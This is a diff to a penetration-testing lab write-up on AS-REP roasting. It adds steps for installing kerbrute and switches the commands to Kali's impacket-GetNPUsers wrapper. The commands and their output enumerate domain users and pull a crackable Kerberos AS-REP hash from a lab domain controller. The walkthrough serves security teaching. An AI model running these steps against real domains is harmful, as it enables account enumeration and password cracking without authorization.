@@ -111,6 +111,21 @@ If preauthentication is **disabled**:
 
 ## 1.2. Use kerbrute to find users with preauthentication disabled
 
+[Kerbrute](https://github.com/TarlogicSecurity/kerbrute) is a script from TarlogicSecurity which uses impacket library to perform kerberos bruteforcing
+
+Install kerbrute
+
+```console
+┌──(root㉿kali)-[~]
+└─# pip3 install kerbrute
+Collecting kerbrute
+  Downloading kerbrute-0.0.2-py3-none-any.whl (17 kB)
+Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from kerbrute) (0.10.0)
+Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->kerbrute) (1.2.4)
+Installing collected packages: kerbrute
+Successfully installed kerbrute-0.0.2
+```
+
 ```console
 ┌──(root㉿kali)-[~]
 └─# kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain lab.vx -dc-ip 192.168.17.11
@@ -130,16 +145,18 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ## 1.3. Use GetNPUsers.py to get password hash
 
+☝️ All impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
+
 ```console
 ┌──(root㉿kali)-[~]
-└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/luke -no-pass -dc-ip 192.168.17.11
+└─# impacket-GetNPUsers lab.vx/luke -no-pass -dc-ip 192.168.17.11
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Getting TGT for luke
 $krb5asrep$23$luke@LAB.VX:83a8d136c9ba393dd708c9aa7592627c$14923c61398475cc0472ed6f9d32058fd2cc40f303bbf4eb0fd7df2bffd0fd9dcb9471ed8dfa40e816f7dc6852b736a89c8ab0d1176f4d37b4c3359639df8d068f05305b51e7d0ed46902c5a7c038565d734a581600ac7619279f9f58c810766abf462b666f5e161f2e4f0a7d00dd4f35220f0e4c7803a291a02aec1f4206b066c6203d72d53b5d87a50d3ec446c9a03744f9662395fe402002859554873cfdccd06a55517072304a3939825068ac58be739c4732cae4efb95bd99fd29a21dfa15c53baff833f0003b56e48037404f6256413fed0c02623ba87b6c6a2d347129
 
 ┌──(root㉿kali)-[~]
-└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/mike -no-pass -dc-ip 192.168.17.11
+└─# impacket-GetNPUsers lab.vx/mike -no-pass -dc-ip 192.168.17.11
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Getting TGT for mike
